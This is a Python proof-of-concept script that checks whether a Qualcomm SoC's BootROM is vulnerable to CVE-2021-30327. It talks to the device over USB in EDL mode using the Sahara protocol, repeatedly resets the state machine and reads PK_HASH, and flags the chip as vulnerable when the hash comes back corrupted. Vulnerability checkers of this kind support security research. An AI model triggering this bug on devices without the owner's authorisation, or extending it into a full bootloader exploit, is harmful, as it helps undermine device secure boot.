#!/usr/bin/env python3
#
# SPDX-FileCopyrightText: 2026 Daniel Grobert <danalexgro@gmail.com>
# SPDX-License-Identifier: AGPL-3.0-or-later
#

import shutil
import usb.core
import usb.util
import usb.backend.libusb1
import libusb
import argparse
import struct
import sys
import os
import coloredlogs
import logging
import re
from time import sleep
from struct import pack
from modules.sahara import *

logger  = logging.getLogger(__name__)

def cmd_exec(edl, mcmd):
    data = pack("<III", SAHARA_CMD_EXEC_ID, 0xC, mcmd)
    edl.write(data)
    resp = edl.read(0x10)
    resp_id = int.from_bytes(resp[0:4], 'little')
    if resp_id == SAHARA_CMD_EXEC_RESP_ID:
        data = pack("<III", SAHARA_CMD_EXEC_DATA_ID, 0xC, mcmd)
        edl.write(data)
        recvdat = edl.read(0x60)
        return recvdat
    return None

def cmdexec_get_pkhash(edl):
    res = cmd_exec(edl, 0x3)
    if res is None:
        logger.error("Failed to read PK_HASH")
        return None
        
    idx = res[4:].find(res[:4])
    if idx != -1:
        res = res[:4 + idx]
    return res.hex()

def auto_int(x): return int(x, 0)
def main():
    coloredlogs.install(
        level="DEBUG",
        fmt="%(asctime)s %(message)s",
        level_styles={
            'debug': {'color': 208, 'bold': True}, # Orange
            'info': {'color': 'cyan', 'bold': True},
            'warning': {'color': 'white', 'bold': True},
            'error': {'color': 'yellow', 'bold': True},
            'critical': {'color': 'red', 'bold': True},
        },
        field_styles={
            'asctime': {'color': 'blue', 'bold': True},
            'levelname': {'bold': True},
        }
    )

    print("A tool to check if your BootROM is vulnerable to CVE-2021-30327")
    parser = argparse.ArgumentParser(description="A PoC for the CVE-2021-30327 vulnerability in Qualcomm Sahara")
    parser.add_argument('-v', '--verbose', help="Enable to view TX/RX Sahara logs", action='store_true')
    parser.add_argument('-pid', help="Override USB PID (default 0x9008)", type=auto_int, default=0x9008, required=False)
    parser.add_argument('-vid', help="Override USB VID (default 0x05C6)", type=auto_int, default=0x05C6, required=False)

    args = parser.parse_args() 

    EDLDevice.verbose = args.verbose
    EDLDevice.pid = args.pid
    EDLDevice.vid = args.vid

    edl = EDLDevice() 
    if not edl.connect():
        raise SystemExit(1)
    
    # Read Sahara hello packet
    data = edl.read(size=0x30)

    cmd, length = struct.unpack_from('<II', data, 0)

    if cmd == SAHARA_HELLO_ID: 
        cmd, length, ver, ver_min, max_pkt, mode = struct.unpack_from('<IIIIII', data, 0)
        logger.info(f"Sahara version {ver}")

        first_pkhash = None

        for _ in range(10000):
            edl.write(bytes([SAHARA_RESET_STATE_MACHINE_ID]))
            edl.read(size=0x30)
            send_hello_resp(edl, mode, ver_min, SAHARA_MODE_COMMAND, ver)
            edl.read(size=0x8)

            pkhash = cmdexec_get_pkhash(edl)
            if not pkhash:
                continue
            
            if first_pkhash is None:
                first_pkhash = pkhash
                logger.info(f"PK_HASH: {pkhash}")
            else:
                if pkhash != first_pkhash:
                    logger.error(f"PK_HASH got corrupted! {pkhash}")
                    logger.error(f"This SoC is vulnerable to CVE-2021-30327.")
                    exit()
                else:
                    logger.info(f"PK_HASH: {pkhash}")

        edl.close()
        exit()
 
    else:
        logger.error(f"Unexpected Sahara command")        

    edl.close()

if __name__ == "__main__":
    main()